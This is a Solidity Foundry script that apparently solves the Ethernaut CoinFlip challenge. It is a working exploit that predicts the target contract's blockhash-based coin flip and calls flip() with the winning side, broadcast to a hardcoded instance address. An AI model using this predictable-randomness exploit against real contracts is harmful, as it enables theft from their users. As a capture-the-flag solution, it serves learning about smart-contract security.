//SPDX: License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/CoinFlip.sol";
import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
   
   CoinFlip public coinFlipInstance = CoinFlip(0xdD3D17CB483B38BC3EDA8091Cfa0485980335b05);

   function run() external {   
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new Player(coinFlipInstance);
    console.log("Consecutive Wins", coinFlipInstance.consecutiveWins());
    vm.stopBroadcast();
   }
}